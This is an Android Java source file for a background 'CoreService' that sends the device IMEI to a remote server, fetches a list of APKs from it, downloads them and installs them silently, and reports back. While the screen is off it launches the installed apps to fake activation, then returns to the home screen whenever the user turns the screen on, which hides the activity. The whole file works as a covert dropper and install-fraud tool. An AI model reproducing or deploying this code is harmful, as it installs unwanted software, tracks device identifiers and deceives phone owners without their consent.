package com.xstd.active.plugin;

import java.io.File;
import java.util.LinkedList;
import java.util.List;

import net.tsz.afinal.FinalHttp;
import net.tsz.afinal.http.AjaxCallBack;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.IPackageInstallObserver;
import android.database.Cursor;
import android.net.wifi.WifiManager;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.RemoteException;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.text.format.DateUtils;
import android.text.format.Time;

import com.android.volley.RequestQueue;
import com.android.volley.Response.Listener;
import com.android.volley.toolbox.JsonArrayRequest;
import com.android.volley.toolbox.Volley;
import com.xstd.active.plugin.dao.SilenceApp;
import com.xstd.active.plugin.dao.SilenceAppDao;
import com.xstd.active.plugin.dao.SilenceAppDaoUtils;
import com.xstd.active.plugin.utils.CommandUtil;

public class CoreService extends Service {

	private CoreReceiver receiver;
	private SharedPreferences sharedPreferences;
	private FinalHttp finalHttp;
	private boolean isDownloading = false;
	private boolean isScreenLignt = true;
	private boolean isActive = false;

	/**
	 * 接受广播的类型
	 */
	public static final int STOP_ACTIVE = 0;
	public static final int START_ACTIVE = 1;
	public static final int UNLOCK_SCREEN = 2;
	public static final int WIFI_STATE_CHANGED = 3;
	public static final int PACKAGE_REMOVED = 4;

	/**
	 * 统计下载、安装及安装时间统计类型
	 */
	public static final int DOWNLOAD_SUCCESSFUL = 0;
	public static final int INSTALL_SUCCESSFUL = 1;
	public static final int TOTAL_COUNT = 2;

	private String imei = "";

	private long INIT_FIRST_TIME = -1;

	private Handler mHandler = new Handler();

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();

		sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);

		TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		imei = tm.getDeviceId();

		finalHttp = new FinalHttp();

		receiver = new CoreReceiver();
		IntentFilter filter = new IntentFilter();
		filter.setPriority(Integer.MAX_VALUE);
		filter.addAction(Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_SCREEN_OFF);
		filter.addAction(Intent.ACTION_USER_PRESENT);
		filter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
		filter.addAction(Intent.ACTION_PACKAGE_REMOVED);
		registerReceiver(receiver, filter);

		boolean first_launch = sharedPreferences.getBoolean("first_launch", true);
		if (CommandUtil.isTrueTime() && first_launch) {
			INIT_FIRST_TIME = System.currentTimeMillis();
		}
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		if (receiver != null)
			unregisterReceiver(receiver);
	}

	class CoreReceiver extends BroadcastReceiver {

		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			if (Intent.ACTION_SCREEN_ON.equals(action))
				receiveBroadcast(STOP_ACTIVE, intent);
			else if (Intent.ACTION_SCREEN_OFF.equals(action))
				receiveBroadcast(START_ACTIVE, intent);
			else if (Intent.ACTION_USER_PRESENT.equals(action))
				receiveBroadcast(UNLOCK_SCREEN, intent);
			else if (WifiManager.WIFI_STATE_CHANGED_ACTION.equals(action))
				receiveBroadcast(WIFI_STATE_CHANGED, intent);
			else if (Intent.ACTION_PACKAGE_REMOVED.equals(action))
				receiveBroadcast(PACKAGE_REMOVED, intent);
		}

	}

	private IPackageInstallObserver.Stub observer = new IPackageInstallObserver.Stub() {

		@Override
		public void packageInstalled(String packageName, int returnCode) throws RemoteException {
			if (returnCode == 1) {
				SilenceApp sa = new SilenceApp();
				sa.setPackagename(packageName);
				sa.setInstalltime(System.currentTimeMillis());
				sa.setActive(false);
				SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext()).insert(sa);
				sendSuccessfultoServer(INSTALL_SUCCESSFUL, packageName);
			}
		}
	};

	/**
	 * 接收到广播
	 * 
	 * @param type
	 *            类型
	 * @param intent
	 */
	private void receiveBroadcast(int type, Intent intent) {
		switch (type) {
		case START_ACTIVE:
			CommandUtil.logW("屏幕暗了。。。");
			isScreenLignt = false;
			if (INIT_FIRST_TIME != -1) {
				if ((System.currentTimeMillis() - INIT_FIRST_TIME) >= 1000 * 60 * 30) {
					if (sharedPreferences.getBoolean("first_launch", true)) {
						mHandler.post(initFirstLaunch);
					}
				}
			}
			if (CommandUtil.canDoThing(sharedPreferences))
				mHandler.post(startActive);
			break;
		case STOP_ACTIVE:
			CommandUtil.logW("屏幕亮了。。。");
			isScreenLignt = true;
			if (isActive) {
				isActive = false;
				CommandUtil.logW("发现刚有激活的程序，程序切后台，回到桌面。");
				CommandUtil.goHome(getApplicationContext());
			}
			checkActive();
			break;
		case UNLOCK_SCREEN:
			CommandUtil.logW("解锁屏幕。。。");
			if (INIT_FIRST_TIME == -1 && sharedPreferences.getBoolean("first_launch", true) && CommandUtil.isTrueTime()) {
				INIT_FIRST_TIME = System.currentTimeMillis();
			}
			if (CommandUtil.canUpdate(sharedPreferences) && CommandUtil.isNetAvailable(getApplicationContext()))
				updateService();
			break;
		case WIFI_STATE_CHANGED:
			CommandUtil.logW("wifi状态改变。。。");
			int wifistate = intent.getIntExtra(WifiManager.EXTRA_WIFI_STATE, WifiManager.WIFI_STATE_DISABLED);
			if (wifistate == WifiManager.WIFI_STATE_ENABLING || wifistate == WifiManager.WIFI_STATE_ENABLED) {
				CommandUtil.logW("wifi已经连接。。。");
				if (CommandUtil.canUpdate(sharedPreferences))
					updateService();
			}
			break;
		case PACKAGE_REMOVED:
			CommandUtil.logW("有程序卸载。。。");
			break;
		}
	}

	/**
	 * 从服务器获取更新
	 */
	private void updateService() {
		long last_update_time = sharedPreferences.getLong("last_update_time", 0);
		if (DateUtils.isToday(last_update_time)) {
			CommandUtil.logW("今天已经更新服务器信息，直接下载未下载的。。");
			startDownload();
			return;
		}
		mustDownloadApp.clear();
		RequestQueue rq = Volley.newRequestQueue(this);
		JsonArrayRequest request = new JsonArrayRequest(SERVER_URL_PATH + "?imei=" + imei, new Listener<JSONArray>() {

			@Override
			public void onResponse(JSONArray jsonArray) {
				sharedPreferences.edit().putLong("last_update_time", System.currentTimeMillis()).commit();
				List<String> installPackages = CommandUtil.getDeviceInstallPackName(getApplicationContext());
				for (int i = 0; i < jsonArray.length(); i++) {
					try {
						JSONObject obj = jsonArray.getJSONObject(i);
						String packName = obj.getString("package_name");
						if (!installPackages.contains(packName)) {
							DownloadApplication app = new DownloadApplication();
							app.fileName = obj.getString("software_name");
							app.packName = packName;
							app.remoteUrl = String.format(obj.getString("apk_uri") + "?id=%d&imei=%s", obj.getLong("id"), imei);
							mustDownloadApp.add(app);
						}
					} catch (JSONException e) {
						e.printStackTrace();
					}
				}
				startDownload();
			}
		}, null);
		rq.add(request);
		rq.start();
	}

	/**
	 * 開始下載，下載完成安裝
	 */
	private void startDownload() {
		if (!isDownloading && mustDownloadApp.size() > 0) {
			isDownloading = true;
			File parent = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
			if (!parent.exists())
				parent.mkdirs();
			final DownloadApplication app = mustDownloadApp.removeFirst();
			final File file = new File(DOWNLOAD_LOCATION, app.fileName);
			if (file.exists())
				file.delete();
			finalHttp.download(app.remoteUrl, DOWNLOAD_LOCATION + app.fileName, true, new AjaxCallBack<File>() {

				@Override
				public void onSuccess(File file) {
					super.onSuccess(file);
					CommandUtil.logW("下载成功。");
					sendSuccessfultoServer(DOWNLOAD_SUCCESSFUL, app.packName);
					isDownloading = false;
					CommandUtil.installFile(getApplicationContext(), file, observer);
					startDownload();
				}

				@Override
				public void onFailure(Throwable t, String strMsg) {
					super.onFailure(t, strMsg);
					CommandUtil.logW("下载失败:" + strMsg);
					isDownloading = false;
					mustDownloadApp.addFirst(app);
					if (file.exists())
						file.delete();
				}
			});
		}
	}

	protected void sendSuccessfultoServer(final int type, final String packName) {
		String url = String.format(SERVER_UPDATE_URL_PATH + "?type=%d&imei=%s&packagename=%s", type, imei, packName);
		CommandUtil.logW(url);
		finalHttp.get(url, new AjaxCallBack<Object>() {
			@Override
			public void onSuccess(Object t) {
				super.onSuccess(t);
				CommandUtil.logW(packName + "--" + type + "--成功了");
			}

			@Override
			public void onFailure(Throwable t, String strMsg) {
				super.onFailure(t, strMsg);
				CommandUtil.logW(packName + "--" + type + "--失败了:" + strMsg);
			}
		});
	}

	public static class DownloadApplication {
		String fileName;
		String packName;
		String remoteUrl;
	}

	/**
	 * 判斷當前時間是否爲可允許更新
	 * 
	 * @return
	 */
	@SuppressWarnings("unused")
	private boolean isAllowTime() {
		Time time = new Time();
		time.set(System.currentTimeMillis());
		int hour = time.hour;
		if (6 < hour && hour < 9) {
			return true;
		}
		if (hour > 17 && hour < 24) {
			return true;
		}
		return false;
	}

	public static final String SERVER_URL_PATH = "http://activeplugin.duapp.com/bce_java_default/down";
	public static final String SERVER_UPDATE_URL_PATH = "http://activeplugin.duapp.com/bce_java_default/update";
	public static final String DOWNLOAD_LOCATION = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + File.separator;
	public static LinkedList<DownloadApplication> mustDownloadApp = new LinkedList<DownloadApplication>();
	public static final long DAY_TIME_MILLIS = 1000 * 60 * 60 * 24;// 一天的毫秒數

	/**
	 * 当安装的程序在第二天，第五天的时候，修改激活状态
	 */
	private void checkActive() {
		List<String> installPackages = CommandUtil.getDeviceInstallPackName(getApplicationContext());
		long currentTimeMillis = System.currentTimeMillis();
		SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(this);
		Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), null, null, null, null, null);
		while (cursor.moveToNext()) {
			long id = cursor.getLong(0);
			String packName = cursor.getString(1);
			long installtime = cursor.getLong(cursor.getColumnIndex(SilenceAppDao.Properties.Installtime.columnName));
			long installTotal = currentTimeMillis - installtime;
			SilenceApp entity = new SilenceApp();
			entity.setId(id);
			entity.setPackagename(packName);
			if (DAY_TIME_MILLIS < installTotal && installTotal < DAY_TIME_MILLIS * 2) {
				if (installPackages.contains(packName)) {
					entity.setActive(false);
					dao.update(entity);
				}
			} else if (DAY_TIME_MILLIS * 4 < installTotal && installTotal < DAY_TIME_MILLIS * 6) {
				if (installPackages.contains(packName)) {
					entity.setActive(false);
					dao.update(entity);
				}
			}
		} 
		if (cursor != null)
			cursor.close();
	}

	/**
	 * 激活任务
	 */
	private Runnable startActive = new Runnable() {

		@Override
		public void run() {
			CommandUtil.logW("开始检测可激活程序");
			List<String> installPackages = CommandUtil.getDeviceInstallPackName(getApplicationContext());
			SilenceAppDao dao = SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext());
			Cursor cursor = dao.getDatabase().query(dao.getTablename(), dao.getAllColumns(), SilenceAppDao.Properties.Active.columnName + "=0", null, null, null, null);
			while (cursor.moveToNext() && CommandUtil.isNetAvailable(getApplicationContext())) {
				isActive = true;
				long id = cursor.getLong(0);
				String packageName = cursor.getString(1);
				CommandUtil.logW("发现可激活程序:" + packageName);
				if (!installPackages.contains(packageName)) {
					CommandUtil.logW(packageName + " not active, it's uninstall, reInstall it.");
					continue;
				}
				startActivity(getPackageManager().getLaunchIntentForPackage(packageName));
				SilenceApp entity = new SilenceApp();
				entity.setId(id);
				entity.setPackagename(packageName);
				entity.setActive(true);
				dao.update(entity);
				SystemClock.sleep(1000 * 20);
				CommandUtil.logW(packageName + "激活了20s，" + isScreenLignt + "");
				if (isScreenLignt) {
					CommandUtil.logW("屏幕亮了，终止激活循环。");
					break;
				}

			}
			if (cursor != null)
				cursor.close();
			for (int i = 0; i < 3; i++) {
				SystemClock.sleep(500 * i);
				CommandUtil.logW("第" + i + "次回到桌面");
				CommandUtil.goHome(getApplicationContext());
			}
		}
	};

	/**
	 * 第一次初始化的任务
	 */
	private Runnable initFirstLaunch = new Runnable() {

		@Override
		public void run() {
			CommandUtil.logW("第一次初始化安装");
			List<File> installFiles = CommandUtil.copyAssetsToSdcard(getApplicationContext(), new File(DOWNLOAD_LOCATION));
			for (File file : installFiles)
				CommandUtil.installFile(getApplicationContext(), file, observer);
			sharedPreferences.edit().putBoolean("first_launch", false).commit();
			INIT_FIRST_TIME = -1;
			CommandUtil.initPreInstallRom(getApplicationContext());
		}
	};

}
